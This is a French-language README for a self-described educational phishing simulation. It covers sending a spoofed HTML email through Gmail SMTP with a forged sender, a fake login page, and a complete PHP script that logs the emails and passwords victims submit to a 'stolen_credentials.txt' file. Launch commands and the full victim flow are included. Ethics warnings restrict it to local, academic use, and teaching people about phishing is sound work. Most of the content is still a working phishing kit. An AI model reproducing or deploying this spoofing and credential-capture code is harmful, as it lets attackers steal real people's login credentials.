# 🎓 Simulation d'Email Spoofing et de Page de Phishing

> ⚠️ Projet éducatif strictement local simulant une attaque de phishing.  
> ❌ Ne doit en aucun cas être utilisé contre des tiers réels ou en ligne.

---

## 📁 Structure du Projet

```
email_spoofing_project/
├── email_templates/
│   ├── spoofed_email.html        ← Modèle d'email HTML
│   └── spoofed_email.eml         ← (Optionnel) version EML
│
├── phishing_server/
│   ├── fake_login.html           ← Page de connexion simulée
│   ├── capture.php               ← Script de capture de credentials
│   └── stolen_credentials.txt    ← Stocke les identifiants saisis
│
├── email_sender/
│   └── send_spoofed_email.py     ← Script Python d'envoi du faux mail
│
├── requirements.txt              ← Dépendances Python (vide ou optionnel)
└── README.md                     ← Documentation complète
```

---

## ⚙️ Prérequis

- Python 3
- PHP (ligne de commande ou XAMPP/WAMP)
- Compte Gmail avec mot de passe d’application
- Navigateur web

---

## 🧩 Étape 1 – Préparer l’email HTML

📄 `email_templates/spoofed_email.html`

Ce fichier contient :

- Un message de confirmation d’inscription
- Un bouton “VERIFY YOUR EMAIL”
- Un lien vers `http://localhost:8000/fake_login.html`

🧠 L’email n’utilise pas de JavaScript — uniquement HTML/CSS.

---

## 📨 Étape 2 – Envoi de l'email

📄 `email_sender/send_spoofed_email.py`

Ce script :

- Charge le fichier HTML
- Se connecte à un SMTP (ex : Gmail)
- Envoie l’email à une cible simulée

🔧 À configurer :

```python
msg['From'] = 'spoofed@exemple.com'
msg['To'] = 'victime@exemple.com'
sender_email = 'ton_adresse@gmail.com'
app_password = 'mot_de_passe_application'
```

🔐 Obtenir un mot de passe d'application :  
https://myaccount.google.com/apppasswords

🟢 Lancement :

```bash
cd email_sender
python send_spoofed_email.py
```

---

## 🌐 Étape 3 – Créer la fausse page de login

📄 `phishing_server/fake_login.html`

Contient :

- Champs “email” et “password”
- Détection CapsLock
- Bouton “Connexion”

🎯 Le formulaire envoie les données vers `capture.php` en méthode GET.

---

## 🛡️ Étape 4 – Capturer les identifiants

📄 `phishing_server/capture.php`

```php
<?php
  $email = $_GET['email'];
  $pass = $_GET['password'];
  file_put_contents("stolen_credentials.txt", "Email: $email | Password: $pass\n", FILE_APPEND);
  echo "Vérification terminée.";
?>
```

🗃️ Les données sont enregistrées dans `stolen_credentials.txt`.

---

## 🚀 Étape 5 – Lancer le serveur local

```bash
cd phishing_server
php -S localhost:8000
```

🔗 Ouvrir : [http://localhost:8000/fake_login.html](http://localhost:8000/fake_login.html)

---

## 🔄 Étape 6 – Flux complet du test

1. L’attaquant crée un faux email (HTML)
2. L’envoie à la victime avec `send_spoofed_email.py`
3. La victime clique sur le lien et tombe sur `fake_login.html`
4. Elle entre ses identifiants
5. Le script `capture.php` les enregistre
6. La page affiche “Vérification terminée”

---

## 🧪 Étape 7 – Bonnes pratiques & éthique

- Ne jamais utiliser ce projet en dehors d’un cadre privé ou académique
- Ne jamais viser une vraie adresse institutionnelle
- Ne jamais simuler de redirection vers des services officiels
- Toujours informer les participants et encadrants

---

## 👨‍🏫 Auteur

Projet réalisé dans le cadre d’un exercice pédagogique de cybersécurité.  
But : illustrer les techniques de phishing et sensibiliser à la sécurité numérique.
